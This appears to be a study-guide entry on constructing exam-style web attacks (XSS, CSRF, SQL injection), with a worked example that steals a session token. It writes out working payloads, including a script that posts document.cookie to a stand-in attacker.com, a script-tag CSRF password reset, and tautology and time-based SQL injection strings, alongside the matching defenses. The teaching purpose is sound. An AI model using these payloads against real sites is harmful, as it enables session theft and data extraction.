name: Web attack construction: XSS, CSRF, SQLi with origin/cookie reasoning
identify_givens: A small web application described by its endpoints and behaviors (login POST returning a session-token cookie, a page that stores user posts or reflects a URL parameter, a state-changing GET/POST endpoint like follow or resetPassword, or a server-side SQL query built by string concatenation of a user-controlled variable), plus the attacker model (network attacker, controls attacker.com, or can only submit posts), the transport (HTTP vs HTTPS), and cookie attributes (Secure, HttpOnly, SameSite). Often a fixed menu of events to order into an attack sequence.
identify_target: Produce a concrete attack that achieves a stated goal: a payload plus the ordered sequence of events (post content, victim page load, attacker server response) that steals the session token, runs JavaScript in a given origin, forces an authenticated action (follow, login-as, password reset), or extracts a boolean/value from the database; and justify why it works (origin of executed script, SOP, cookie flags) or which defense blocks it.
strategy_name: Match goal to injection channel, then trace origin and cookie flow

algorithm.detail: Decide what the attacker must achieve: (a) execute JS in the victim site's origin (XSS), (b) make the victim's browser send an authenticated request (CSRF), or (c) alter the SQL query's logic (SQLi). The goal, not the delivery tag, determines the class — a <script src=...> that only triggers a request without loading real JS is CSRF, not XSS.

Read the givens that gate each attack: HTTP + network attacker means read/inject on the wire regardless of cookie flags; Secure=true blocks cookie theft over HTTP but not HTTPS; HttpOnly=false is required to read document.cookie from JS; a stored input field (posts/comments) enables stored XSS, a reflected URL parameter (msg=X) enables reflected XSS; string-concatenated SQL with '-delimited literals enables injection.

XSS: to exfiltrate, or to act. CSRF: or a hidden form, relying on the browser auto-attaching cookies. SQLi: close the quote and extend the logic, e.g. ' OR 1=1 -- to dump all rows, X' AND customerName='Bob' -- for boolean inference, or append AND SLEEP(10)=1 for time-based blind extraction.

Sequence the allowed events so prerequisites come first: victim logs in before the cookie-bearing page load; attacker's malicious post is stored before the victim visits the listing; for an attacker-origin script, store an <iframe src="attacker.com"> first, then have attacker.com serve the <script>. One event per row with the placeholder value filled in.

State why it works: a script executes with the origin of the page that loaded it (so a stored post runs as the victim site's origin, an iframe runs as attacker.com); SOP blocks reading cross-origin responses but never blocks sending requests, and cookies are attached automatically — which is exactly why CSRF works and why cookie exfiltration to attacker.com is observable there.

Note any extra assumption (e.g. SLEEP(10) must be short-circuit-evaluated only when the AND's left side is true) and name the matching defense when asked: output encoding/CSP for XSS, CSRF tokens/SameSite cookies for CSRF, parameterized queries for SQLi, HttpOnly against JS cookie theft, HTTPS against network attackers.

variations.name: Attack-class identification with T/F origin statements
variations.detail: Instead of constructing the attack, the exam shows a payload (e.g. <script src="https://attacker.com/payload.js"></script> in a stored post) and asks to judge statements: the script runs with the origin of the loading page (fakebook.com), not the origin hosting the file; SOP does not block fetching the file; and cookie-stealing via a stored post is stored XSS, not DOM-based. Trap: students confuse the script's hosting origin with its execution origin, and mislabel stored vs DOM-based.

variations.name: CSRF disguised as XSS
variations.detail: A payload like <script src="https://fakebook.com/resetPassword?password=42"></script> uses a script tag but loads no real JS — it only makes the victim's browser issue the authenticated GET with cookies attached. The correct classification is CSRF; the algorithm adapts by checking whether any attacker JavaScript actually executes. Trap: answering 'XSS' because of the <script> tag.

variations.name: Cookie/transport flag flips
variations.detail: The same session-token-theft goal is re-asked under different flags: HTTP + HttpOnly=true forces a pure network-sniffing answer (read the login response on the wire, JS cannot help); HTTPS + HttpOnly=false forces a reflected/stored XSS with document.cookie exfiltration. Trap: proposing document.cookie when HttpOnly=true, or proposing wire sniffing when the traffic is HTTPS and the attacker is only a network attacker.

variations.name: Blind and time-based SQLi
variations.detail: After the tautology (' OR 1=1 --) and row-count boolean variants, the professor hides the output ('Ticket count not available') and requires a timing channel: X' AND customerName='Bob' AND SLEEP(10)=1 --, inferring the boolean from response delay. The algorithm adapts by replacing output-observation with timing-observation, and requires explicitly stating the short-circuit assumption that SLEEP only runs when the preceding AND terms are true. Trap: forgetting the assumption or leaving the string literal unterminated.

example_problem: Website www.readbooks.com: users log in via POST to /login (response sets a session-token cookie); a logged-in user loading /home?msg=X sees all posts plus message X reflected at the top; Malice is a network attacker who also controls www.attacker.com; the JS helper post(url, params) is available. Assume all traffic is HTTPS and the session cookie has Secure=true, HttpOnly=false. Attack: use a reflected XSS attack to learn the value of Albin's session token.

example_steps.work: Classify the goal: steal the session token. Traffic is HTTPS, so the network attacker cannot read the cookie off the wire; but HttpOnly=false means JavaScript running in the readbooks.com origin can read document.cookie — this calls for XSS, and the reflected msg parameter is the injection channel.

Check flags: Secure=true only restricts sending the cookie over HTTP, which is irrelevant under HTTPS; HttpOnly=false is exactly the condition that makes document.cookie readable from injected JS, so the attack is feasible.
Craft the payload: X = <script>post("www.attacker.com",document.cookie)</script>, which sends the cookie to Malice's server.

Order the events: (3, None) Albin makes the POST login with his correct username and password, so his browser holds the session cookie; then (2, <script>post("www.attacker.com",document.cookie)</script>) Albin loads /home?msg=<script>post("www.attacker.com",document.cookie)</script>, so the page reflects and executes the script.

Justify: the reflected script executes with the origin www.readbooks.com (origin of the loading page), so SOP does not stop it from reading document.cookie; the browser may send requests cross-origin (SOP blocks reading responses, not sending), so post() delivers the cookie to www.attacker.com where Malice observes it.
